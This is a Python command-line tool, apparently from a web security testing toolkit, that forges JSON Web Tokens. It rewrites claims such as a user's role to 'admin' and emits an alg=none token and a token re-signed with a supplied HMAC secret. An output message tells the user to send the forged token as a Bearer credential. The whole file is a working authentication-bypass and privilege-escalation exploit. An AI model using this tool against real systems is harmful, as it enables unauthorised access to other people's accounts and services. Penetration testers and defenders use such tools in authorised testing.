#!/usr/bin/env python3
"""jwt_forge.py — mint forged JWTs from the command line. Stdlib only.

Sibling boundary to tools/web/session_dissect.py: that tool ANALYSES and
recovers secrets but never forges. This tool does the opposite: it takes a
token (or a payload), applies claim overrides, and emits forged variants —
an alg=none token and an HS*-re-signed token under a supplied secret.
Nothing is sent anywhere: the output is the token strings to hand to
http_probe or curl, and the decision to send one is the operator's.

Usage:
  python tools/web/jwt_forge.py --token <jwt> [--claims '{"role":"admin"}']
                                [--secret s] [--alg hs256|hs384|hs512]
                                [--none-only]
  python tools/web/jwt_forge.py --selftest
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys

_ALGS = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
         "hs512": hashlib.sha512}


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64d(text: str) -> bytes:
    return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))


def forge(token: str, claims: dict | None = None, secret: str = "",
          alg: str = "") -> dict:
    parts = token.strip().strip('"\'').split(".")
    if len(parts) not in (2, 3):
        return {"error": "not a JWT (expected 2 or 3 segments)"}
    try:
        header = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
    except Exception as exc:
        return {"error": f"decode failed: {exc}"}
    payload.update(claims or {})

    out: dict = {"payload_used": payload}
    src_alg = (header.get("alg") or "").lower()

    # alg=none variant — always emitted; acceptance is the server's bug
    h_none = _b64e(json.dumps({**header, "alg": "none"},
                             separators=(",", ":")).encode())
    p64 = _b64e(json.dumps(payload, separators=(",", ":")).encode())
    out["alg_none"] = f"{h_none}.{p64}."

    if secret:
        use_alg = (alg or src_alg).lower()
        if use_alg not in _ALGS:
            out["resign_error"] = (f"token alg is {header.get('alg')}; only "
                                   "HS* re-signing is supported — try "
                                   "alg_none or a different --alg")
        else:
            h = dict(header, alg=use_alg.upper())
            h64 = _b64e(json.dumps(h, separators=(",", ":")).encode())
            sig = _b64e(hmac.new(secret.encode(),
                                 f"{h64}.{p64}".encode(),
                                 _ALGS[use_alg]).digest())
            out["resigned"] = f"{h64}.{p64}.{sig}"
            out["resigned_alg"] = use_alg.upper()
    out["note"] = ("send 'resigned' or 'alg_none' as the token value "
                   "(Authorization: Bearer <token> or the original carrier); "
                   "a 200 honouring the forged claims is the finding")
    return out


def _selftest() -> int:
    secret = "s3cret"
    h = _b64e(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    p = _b64e(json.dumps({"user": "alice", "role": "user"}).encode())
    sig = _b64e(hmac.new(secret.encode(), f"{h}.{p}".encode(),
                         hashlib.sha256).digest())
    tok = f"{h}.{p}.{sig}"

    ok = True
    out = forge(tok, claims={"role": "admin"}, secret=secret)
    ok &= "resigned" in out and "alg_none" in out
    # verify the forged signature actually verifies
    rh, rp, rs = out["resigned"].split(".")
    expect = _b64e(hmac.new(secret.encode(), f"{rh}.{rp}".encode(),
                            hashlib.sha256).digest())
    ok &= hmac.compare_digest(rs, expect)
    ok &= json.loads(_b64d(rp))["role"] == "admin"
    ok &= out["alg_none"].endswith(".")
    # non-HS token gives a structured resign error, not a crash
    h2 = _b64e(json.dumps({"alg": "RS256"}).encode())
    out2 = forge(f"{h2}.{p}.x", secret="k")
    ok &= "resign_error" in out2 and "alg_none" in out2
    ok &= "error" in forge("not-a-token")
    print(json.dumps({"selftest": "pass" if ok else "fail"}))
    return 0 if ok else 1


def main() -> int:
    p = argparse.ArgumentParser(description="Forge JWT variants (alg=none, HS* re-sign)")
    p.add_argument("--token", help="the JWT to forge from")
    p.add_argument("--claims", default="{}", help="JSON object of claim overrides")
    p.add_argument("--secret", default="", help="signing secret for HS* re-sign")
    p.add_argument("--alg", default="", choices=["", "hs256", "hs384", "hs512"],
                   help="override the sign alg (default: keep the token's)")
    p.add_argument("--selftest", action="store_true")
    args = p.parse_args()
    if args.selftest:
        return _selftest()
    if not args.token:
        p.error("--token required (or --selftest)")
    try:
        claims = json.loads(args.claims)
        if not isinstance(claims, dict):
            raise ValueError("claims must be a JSON object")
    except ValueError as exc:
        print(json.dumps({"error": f"--claims invalid: {exc}"}))
        return 2
    print(json.dumps(forge(args.token, claims=claims, secret=args.secret,
                           alg=args.alg), indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
